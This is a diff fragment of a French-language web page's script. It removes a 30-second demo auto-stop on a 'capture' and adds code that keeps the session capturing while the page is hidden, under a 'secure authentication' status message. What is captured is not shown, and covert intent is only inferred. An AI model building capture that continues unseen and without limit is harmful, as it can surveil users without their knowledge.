     window.addEventListener('beforeunload', () => {
       stopCapture();
     });
 
-    // 🎯 Pour les tests : arrêter après 30 secondes
-    setTimeout(() => {
-      console.log('🛑 Arrêt automatique après 30 secondes (mode démo)');
-      stopCapture();
-    }, 30000);
+    // Gestion de la visibilité de la page
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden && appState.sessionActive) {
+        // Continuer la capture même si la page n'est pas visible
+        console.log('📱 Page cachée - maintien de la session');
+      }
+    });
+
+    // Messages d'état initial
+    updateStatus("Prêt pour l'authentification sécurisée", 'info');
+
+    // Créer quelques éléments flottants supplémentaires dynamiquement
+    function createFloatingElements() {
+      const container = document.querySelector('.background-elements');
+      for (let i = 0; i < 5; i++) {
+        const element = document.createElement('div');
+        element.className = 'floating-element';
+        element.style.left = Math.random() * 100 + '%';
+        element.style.animationDelay = Math.random() * 20 + 's';
+        element.style.animationDuration = (15 + Math.random() * 10) + 's';
+        container.appendChild(element);
+      }
+    }
+
+    // Initialisation
+    createFloatingElements();
   </script>
 </body>
 </html>
